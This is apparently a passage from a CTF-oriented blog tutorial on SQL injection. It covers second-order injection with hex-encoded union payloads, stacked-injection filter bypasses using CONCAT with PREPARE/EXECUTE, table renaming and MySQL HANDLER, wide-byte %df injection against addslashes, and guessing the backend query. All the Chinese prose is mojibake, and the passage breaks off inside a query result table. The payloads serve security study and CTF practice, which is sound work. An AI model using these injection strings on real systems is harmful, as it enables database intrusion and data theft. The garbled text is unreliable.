<p>å¦‚æœæˆ‘ä»¬è¾“å…¥æ­£å¸¸çš„idï¼Œé‚£ä¹ˆç¬¬ä¸€å¥è¯å°±ä¼šå¾—åˆ°ä¸€ä¸ªç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// res1 æ˜¯ä¸€ä¸ªæ•°ç»„</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| id   | username | email         |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">|    1 | admin    | admin@163.com |</span><br><span class="line">+------+----------+---------------+</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆæ­¤æ—¶<code>$res[1]=admin</code>ï¼Œé‚£ä¹ˆç¬¬äºŒå¥è¯å°±èƒ½å¾—åˆ° <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+----------+----------+-------+</span><br><span class="line">| id   | username | password | camp  |</span><br><span class="line">+------+----------+----------+-------+</span><br><span class="line">|    1 | admin    | admin    | admin |</span><br><span class="line">+------+----------+----------+-------+</span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶å†è¿›è¡Œåç»­çš„æ“ä½œã€‚</p>
<p>ç»è¿‡è¿™æ ·çš„ä¸¤æ¬¡æ“ä½œï¼Œè™½ç„¶è¯´sqlæ³¨å…¥è¿˜æ˜¯å­˜åœ¨ï¼Œä½†æ˜¯å¾ˆéš¾è¢«å‘ç°ã€‚é‚£ä¹ˆè¯¥å¦‚ä½•æ³¨å…¥å‘¢ï¼Ÿä¸‹é¢è¿›è¡Œè¯´æ˜ã€‚ ### 3.4.2. åˆ©ç”¨ é¢˜ç›®ä¸ºæ•°å­—å‹ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šè¾“å…¥å¦‚ä¸‹payloadæ¥åˆ¤æ–­å›æ˜¾ä½ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+----------+----------+------+</span><br><span class="line">| id   | username | password | camp |</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">|    1 | 2        | 3        | 4    |</span><br><span class="line">+------+----------+----------+------+</span><br></pre></td></tr></table></figure></p>
<p>å‡å¦‚æˆ‘ä»¬çŸ¥é“usernameå­—æ®µæ‰€åœ¨çš„ä½ç½®æ˜¯ç¬¬äºŒä¸ªï¼Œé‚£ä¹ˆï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// æ­£å¸¸çš„åå°ä¼šåˆ©ç”¨limitåªå›æ˜¾ä¸€æ¡ä¿¡æ¯</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">| id   | username | password | camp |</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">|    1 | admin    | 3        | 4    |</span><br><span class="line">+------+----------+----------+------+</span><br></pre></td></tr></table></figure></p>
<p>è™½ç„¶æ˜¯äºŒæ¬¡æŸ¥è¯¢ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡æŸ¥è¯¢ä¹Ÿåªæ˜¯ç®€å•çš„æŸ¥è¯¢ç½¢äº†ï¼Œå¦‚æœè¿”å›çš„ç»“æœä¸­çš„usernameçš„å€¼èƒ½å¤Ÿè¢«æ§åˆ¶ï¼Œå³å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè®©è¿”å›çš„ä¿¡æ¯å˜æˆä¸‹é¢çš„æ ·å­ï¼Œé‚£å…¶å®ä¹Ÿåªæ˜¯ç®€å•çš„SQLæ³¨å…¥ç½¢äº†ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+----------+----------+------+</span><br><span class="line">| id   | username | password | camp |</span><br><span class="line">+------+----------+----------+------+</span><br><span class="line">|    1 | payload  | 3        | 4    |</span><br><span class="line">+------+----------+----------+------+</span><br></pre></td></tr></table></figure></p>
<p>é‚£è¯¥å¦‚ä½•å®ç°äº†ï¼Œselect æˆ–è€… union select æ­¤æ—¶ä¸èƒ½å¤Ÿç®€å•çš„ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,admin<span class="string">&#x27;,3,4 from users;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>select å’Œ union selectåé¢è¦ä¹ˆè·Ÿä¸Šæ•°å­—ï¼Œè¦ä¹ˆè·Ÿä¸Šå­—æ®µåï¼Œå¦‚æœè¦æƒ³éšä¾¿è·Ÿä¸Šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œéœ€è¦ç”¨å¼•å·æ‹¬èµ·æ¥ã€‚</p>
</blockquote>
<p>è¿™é‡Œå…¶å®æœ‰ä¸¤ç§åŠæ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. select * from users where id = -1 union select 1,0x61646d696e27,3,4 from users;</span><br><span class="line">2. select * from users where id = -1 union select 1,&quot;admin&#x27;&quot;,3,4 from users;</span><br></pre></td></tr></table></figure></p>
<p>ç¬¬ä¸€ç§æ˜¯å°†admin'è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼Œç¬¬äºŒç§å°±æ˜¯ç®€å•çš„ç”¨æ‹¬å·æ‹¬èµ·æ¥ã€‚ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</p>
<blockquote>
<p>ä¸ªäººç†è§£ï¼š16è¿›åˆ¶ä¼šè¢«å½“ä½œå°±æ˜¯æ•°å­—ï¼Œä»è€Œä¸ä¼šæŠ¥é”™ã€‚è¦æ˜ç¡®<strong>æˆ‘ä»¬éœ€è¦çš„ä¸æ˜¯å…¨æ•°å­—ï¼Œè€Œæ˜¯ç‰¹æ®Šæ„ä¹‰çš„æ•°å­—</strong>ã€‚ä¸ºä»€ä¹ˆä¸ç”¨å…¶ä»–è¿›åˆ¶çš„åŸå› æ˜¯10ï¼Œ2è¿›åˆ¶å‰é¢ä»€ä¹ˆéƒ½ä¸åŠ ï¼Œ8è¿›åˆ¶å‰é¢æ˜¯æ•°å­—0ï¼Œæ‰€æœ‰å­—ç¬¦è½¬æˆè¿™ä¸‰ç§è¿›åˆ¶éƒ½æ˜¯çº¯æ•°å­—ã€‚è€Œ16è¿›åˆ¶å‰é¢æœ‰0xä¼šè¢«è¯†åˆ«æˆ16è¿›åˆ¶ã€‚</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426204540.png" /></p>
<p>ä½†æ˜¯å¹¶ä¸æ¨èåè€…ï¼Œå› ä¸ºå¾€å¾€åƒusernameè¿™æ ·çš„å­—ç¬¦å‹ï¼Œéƒ½ä¼šå¸¦æœ‰å•å¼•å·ï¼Œä»è€ŒåŒå¼•å·ä¸èƒ½å¤Ÿèµ·ä½œç”¨ï¼Œæˆ‘è¿™é‡Œæ¼”ç¤ºçš„æ˜¯æ²¡æœ‰é—­åˆæ–¹å¼çš„ã€‚</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„è”åˆæ³¨å…¥çš„è¿‡ç¨‹äº†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæœ‰å¯èƒ½ä¸€äºŒä¸¤æ¬¡æŸ¥è¯¢çš„ä¸æ˜¯ä¸€ä¸ªè¡¨ï¼Œä¹Ÿå°±æ˜¯å­—æ®µæ•°å¯èƒ½ä¸åŒï¼Œæ‰€ä»¥è¿˜éœ€è¦é‡æ–°è¿›è¡Œå­—æ®µæ•°åˆ¤æ–­ã€‚ä¸€èˆ¬åˆ©ç”¨payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,payload,3,4 from users # payload éƒ½éœ€è¦ç»è¿‡16è¿›åˆ¶ç¼–ç </span><br></pre></td></tr></table></figure></p>
<h2 id="å †å æ³¨å…¥">3.5. å †å æ³¨å…¥</h2>
<h3 id="åŸç†-1">3.5.1. åŸç†</h3>
<p>åŸç†ï¼šåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ [[#1 8 ä¸€æ¬¡æ‰§è¡Œå¤šæ¡sqlè¯­å¥]]</p>
<p><strong>åŸç†å…¶å®å¾ˆç®€å•ï¼Œéš¾ç‚¹åœ¨äºæŸ¥è¯¢å­—æ®µä¿¡æ¯æ—¶å¿…é¡»è¦ç”¨åˆ° selectï¼Œè€Œä¸€èˆ¬è€ƒå¯Ÿå †å æ³¨å…¥çš„é¢˜ç›®éƒ½ä¼šå°†selectè¿‡æ»¤æ‰ã€‚è¿™å…¶å®å¯¹æˆ‘ä»¬æ˜¯æœ‰å¥½å¤„çš„ï¼Œä»¥åå¦‚æœç¢°åˆ°SQLæ³¨å…¥çš„é¢˜ç›®è¿‡æ»¤äº†selectï¼Œå¹¶ä¸”æ— æ³•ç»•è¿‡ï¼Œå¯ä»¥ç›´æ¥è€ƒè™‘å †å æ³¨å…¥ã€‚</strong></p>
<h3 id="åˆ©ç”¨">3.5.2. åˆ©ç”¨</h3>
<h4 id="é¢„ç¼–è¯‘-1">3.5.2.1. é¢„ç¼–è¯‘</h4>
<p>å¦‚æœè¢«è¿‡æ»¤äº†selectå¯¼è‡´æ— æ³•æŸ¥çœ‹å­—æ®µä¿¡æ¯ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨è¯¥åŠæ³•ï¼ˆå‰ææ˜¯é¢„ç¼–è¯‘çš„å…³é”®è¯æ²¡è¢«è¿‡æ»¤ï¼‰</p>
<p>åŸç†ï¼š[[#1 9 é¢„ç¼–è¯‘]]</p>
<p>ä»¥[[å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨]]ä¸[[æ”»é˜²ä¸–ç•Œ_supersqli]]ï¼ˆä¸¤è€…æ˜¯ä¸€é“é¢˜ï¼‰çš„payloadä¸ºä¾‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br><span class="line">è½¬ä¸ºå¦‚ä¸‹ä»£ç ï¼š</span><br><span class="line">sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br><span class="line">prEpare stmt from @sql;</span><br><span class="line">EXECUTE stmt;</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨concatæ‹¼æ¥å­—ç¬¦ä¸²å¾—åˆ°selectï¼Œç„¶åä½¿ç”¨é¢„ç¼–è¯‘å°±å¯ä»¥ä¸ç”¨å†è¾“å…¥selectï¼Œä»è€Œå®ç°äº†ç»•è¿‡ã€‚</p>
<h4 id="æ”¹è¡¨å">3.5.2.2. æ”¹è¡¨å</h4>
<p>è¿™ä¸ªçš„ä½¿ç”¨æ¡ä»¶ç•¥å¾®æœ‰ç‚¹è‹›åˆ»ï¼š</p>
<ol type="1">
<li>å…³é”®è¯alterã€renameä¸èƒ½è¢«è¿‡æ»¤ï¼›</li>
<li>éœ€è¦çš„ä¿¡æ¯ä¸åœ¨å½“å‰è¡¨å†…ï¼›</li>
<li>åå°æœ‰é»˜è®¤æŸ¥è¯¢çš„è¡¨ï¼›</li>
</ol>
<p>é¢˜ç›®å’Œ[[#é¢„ç¼–è¯‘]]ä¸€æ ·ã€‚åœ¨è¯¥é¢˜ç›®ä¸­ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥<code>1' or 1=1</code>ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠwordsè¡¨ä¸­çš„æ‰€æœ‰ä¿¡æ¯éƒ½æ˜¾ç¤ºå‡ºæ¥ï¼Œç„¶åflagåœ¨å¦ä¸€ä¸ªè¡¨ä¸­ã€‚</p>
<p>å‡è®¾ä¸€ä¸ªè¡¨ä¸ºtable1ï¼Œå¦ä¸€ä¸ªè¡¨ä¸ºtable2ï¼Œtable1ä¸­æœ‰ä¸€ä¸ªå­—æ®µä¸ºidï¼Œtable2ä¸­æœ‰ä¸€ä¸ªå­—æ®µä¸ºflagï¼Œé»˜è®¤æŸ¥è¯¢çš„æ˜¯table1,åå°è¯­å¥ä¸º<code>select * from table1 where id='è¾“å…¥'</code>ã€‚æ­¤æ—¶å¯ä»¥ï¼š</p>
<ol type="1">
<li>table1æ”¹åä¸ºanyTableï¼›</li>
<li>table2æ”¹åä¸ºtable1ï¼›</li>
<li>table1.flagæ”¹åä¸ºtable1.id</li>
</ol>
<p>é‚£ä¹ˆåªè¦whereåé¢ä¸º1ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œ<code>select * from table1</code>ä»è€Œå¾—åˆ°flagã€‚</p>
<h4 id="handlermysqlä¸“å±">3.5.2.3. handler(mysqlä¸“å±)</h4>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•ç»“æ„ï¼š</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] </span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
<p>å¦‚ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler tableName open [as alias];  #æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½å</span><br><span class="line">handler tableName/alias read first; #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®</span><br><span class="line">handler tableName/alias read next;  #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span><br><span class="line">handler tableName/alias read next;  #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span><br><span class="line">...</span><br><span class="line">handler tableName/alias close;      #å…³é—­å¥æŸ„</span><br></pre></td></tr></table></figure></p>
<p>å½“ä¸Šé¢ä¸¤ä¸ªåŠæ³•æ‰€ä½¿ç”¨çš„å…³é”®è¯éƒ½è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨è¯¥åŠæ³•æ¥è¯»å–å­—æ®µä¿¡æ¯ã€‚</p>
<p>é¢˜ç›®ï¼š[[GYCTF2020 Blacklist]]ã€‚æœ€ç»ˆè¯»å–flagçš„payloadä¸ºï¼š(å¯ä»¥ä¸åŠ åå¼•å·) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;handler `FlagHere` open;handler `FlagHere` read first;--+</span><br></pre></td></tr></table></figure></p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥">3.6. å®½å­—èŠ‚æ³¨å…¥</h2>
<h3 id="è®¤è¯†addslasheså‡½æ•°">3.6.1. è®¤è¯†addslasheså‡½æ•°</h3>
<p><strong>å®šä¹‰å’Œç”¨æ³•ï¼š</strong> &gt; addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ &gt; é¢„å®šä¹‰ç¬¦å·ï¼šå•å¼•å·ï¼ˆ'ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ"ï¼‰ï¼Œåæ–œæ ï¼ˆï¼‰ï¼ŒNULLã€‚</p>
<p><strong>ä¾‹å­ï¼š</strong> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where id = 1&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL; <span class="comment"># æ¢è¡Œ</span></span><br><span class="line"><span class="keyword">echo</span> addslashes(<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id = 1&#x27;from users;</span><br><span class="line">select id = 1\&#x27; from users;</span><br></pre></td></tr></table></figure></p>
<p>å¯¹äºç®€å•çš„å­—ç¬¦å‹ã€æ•°å­—å‹æ³¨å…¥ï¼Œç»è¯¥å‡½æ•°è½¬ä¹‰çš„sqlè¯­å¥ç¡®å®ä¼šâ€œå¡æ­»â€œå•å¼•å·ã€‚ï¼ˆæ„é€ æ”»å‡»çš„sqlè¯­å¥ä¸ä¼šæ‰§è¡Œï¼‰</p>
<p>æ­¤æ—¶çš„éš¾ç‚¹å°±æ˜¯<strong>å¦‚ä½•è®©æˆ‘ä»¬è¾“å…¥çš„å•å¼•å·ç»•è¿‡è¯¥å‡½æ•°ï¼Œä»è€Œä½¿æ„é€ çš„sqlæ‰§è¡Œ</strong>ã€‚</p>
<h3 id="åŸç†-2">3.6.2. åŸç†</h3>
<p>å®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨äº†mysqlä¸€ä¸ªç‰¹æ€§ï¼Œ<strong>å³å½“mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—</strong>ã€‚ï¼ˆå‰ä¸€ä¸ªASCIIç <strong>è¦å¤§äº128</strong>ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰</p>
<p>é¦–å…ˆéœ€è¦äº†è§£ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„urlç¼–ç ï¼ˆasciiç ä¸­çš„å­—ç¬¦ç”¨ % + 16è¿›åˆ¶ï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç©ºæ ¼  %20</span><br><span class="line">&#x27;     %27</span><br><span class="line">#     %23</span><br><span class="line">\     %5c</span><br></pre></td></tr></table></figure></p>
<p>å½“è¾“å…¥å•å¼•å·æ—¶ï¼Œç»è¿‡addslashesä¼šå¾—åˆ°<code>\'</code>ï¼Œurlç¼–ç ä¸º<code>%5C%27</code>ã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸º<code>%df'</code>ï¼Œï¼ˆåœ¨å•å¼•å·å‰é¢æ·»åŠ ä¸€ä¸ªASCIIç å¤§äº128çš„å­—ç¬¦ï¼‰ç»è¯¥å‡½æ•°åå¾—åˆ°<code>%df%5c%27</code>ï¼Œå¦‚æœä½¿ç”¨çš„GBKç¼–ç çš„è¯ï¼Œ<code>%df%5c</code>ä¼šè¢«å½“ä½œä¸€ä¸ªæ±‰å­—å¤„ç†ï¼Œæœ€åçš„ç»“æœä¸º<code>é‹'</code>ï¼Œæ­¤æ—¶å‰ä¸¤ä¸ªå­—èŠ‚ç»“åˆï¼Œåä¸€ä¸ªå­—èŠ‚å•ç‹¬ï¼Œè€Œåä¸€ä¸ªå­—èŠ‚æ­£å¥½æ—¶å•å¼•å·ï¼Œå•å¼•å·é€ƒå‡ºé™åˆ¶ï¼</p>
<h2 id="æ¨æµ‹åç«¯è¯­å¥">3.7. æ¨æµ‹åç«¯è¯­å¥</h2>
<p>ç„å­¦ï¼ï¼ï¼[[SUCTF 2019 EasySQL]]ï¼Œæœ¬é¢˜æ˜¯å †å æ³¨å…¥ï¼Œä¸è¿‡éœ€è¦å¯¹åç«¯è¯­å¥è¿›è¡ŒçŒœæµ‹ã€‚</p>
<p><strong>åœ¨æœ¬é¢˜ä¸­ï¼Œåªæœ‰å½“æˆ‘ä»¬è¾“å…¥éé›¶æ•°å­—æ—¶ï¼Œæ‰ä¼šæœ‰å›æ˜¾1ï¼Œå…¶ä»–éƒ½ä¸å›æ˜¾</strong>ã€‚å› æ­¤çŒœæµ‹åç«¯è¯­å¥ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">select</span> $query <span class="operator">||</span> columnName <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤å¦‚æœæˆ‘ä»¬è¾“å…¥0æˆ–è€…å…¶ä»–å­—ç¬¦<code>select 0||columnName from tableName</code>ï¼Œå› ä¸ºå­—æ®µåä¸€èˆ¬ä¸ä»¥æ•°å­—å¼€å¤´ï¼Œæ‰€ä»¥â€˜æˆ–â€™çš„ç»“æœä¸€å®šæ˜¯0ã€‚è¿™é‡Œæ²¡æœ‰æ˜¾ç¤ºï¼ˆå…¶å®æ˜¯ä¼šæ˜¾ç¤ºçš„ï¼Œæœ¬åœ°æµ‹éªŒç»“æœå¦‚ä¸‹ï¼‰å¯èƒ½æœ‰ä¸€ä¸ªå‡½æ•°ï¼šå¦‚æœè¿”å›å€¼ä¸º0åˆ™ä¸æ˜¾ç¤ºå§ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426223232.png" /></p>
<p>æ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬éœ€è¦<code>select column1, column2 from table_name</code>æ˜¯å¯ä»¥æ˜¾ç¤ºå¤šæ¡columnsçš„ä¿¡æ¯çš„ï¼Œè¿™é‡Œä¹Ÿä½¿ç”¨è¿™ä¸ª,æ„é€ <code>select *,1||columnName from tableName</code>å°±ä¼šå›æ˜¾<code>*</code>å’Œ<code>1||columnName</code>çš„ç»“æœã€‚(1æ”¹ä¸º0ä¹Ÿå¯ä»¥)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>, <span class="number">1</span> <span class="operator">||</span> username <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span> <span class="number">1</span> <span class="operator">||</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin    <span class="operator">|</span> admin  <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> root     <span class="operator">|</span> root     <span class="operator">|</span> root   <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> you      <span class="operator">|</span> you      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">6</span> <span class="operator">|</span> run      <span class="operator">|</span> run      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>, <span class="number">0</span> <span class="operator">||</span> username <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span> <span class="number">0</span> <span class="operator">||</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin    <span class="operator">|</span> admin  <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> root     <span 